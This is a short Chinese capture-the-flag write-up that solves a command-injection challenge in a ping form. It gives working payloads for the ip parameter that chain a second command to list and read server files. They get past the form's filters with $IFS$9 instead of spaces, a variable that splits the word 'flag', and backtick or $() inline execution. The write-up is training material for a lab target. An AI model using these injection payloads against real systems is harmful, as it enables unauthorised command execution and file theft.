### buuoj_GXYCTF 2019 PIng PIng PIng

这个看样子是要输一个IP地址，先试探一下

```
?ip=127.0.0.1
?ip=127.0.0.1|ls
```

![](https://pic.imgdb.cn/item/60facf095132923bf86c81b5.jpg)

找到flag文件了

试一下直接输出

```
?ip=127.0.0.1|cat flag.php
```

![](https://pic.imgdb.cn/item/60facf565132923bf86dea5f.jpg)

有被冒犯到，又试了几种绕过空格的方式都不行

看大佬的wp发现还有这种绕过

```
${IFS}
$IFS$9		#可行
```

![](https://pic.imgdb.cn/item/60fad0bb5132923bf87457c1.jpg)

结果发现flag被过滤了，那就看看另一个文件

![](https://pic.imgdb.cn/item/60fad0de5132923bf874fb4e.jpg)

可以看见特殊符号这些基本上都被过滤了

1）可以使用变量的方式来绕过，只要 f、l、a、g 四个字母不按照顺序即可，payload如下：

```   
?ip=;z=g;cat$IFS$9fla$z.php
```

（2）我们发现代码中没有过滤反引号，那么可以内联执行命令，即用反引号内执行的输出作为另一个命令的输入执行，payload如下：

```
?ip=;cat$IFS$9`ls`
```

### 内联执行执行

```
cat$IFS$9`ls`
cat$IFS$9$(ls)
这两个命令也意思就是执行当前目录下的所有文件
123
```

**(内联，就是将``或$()内命令的输出作为输入执行)**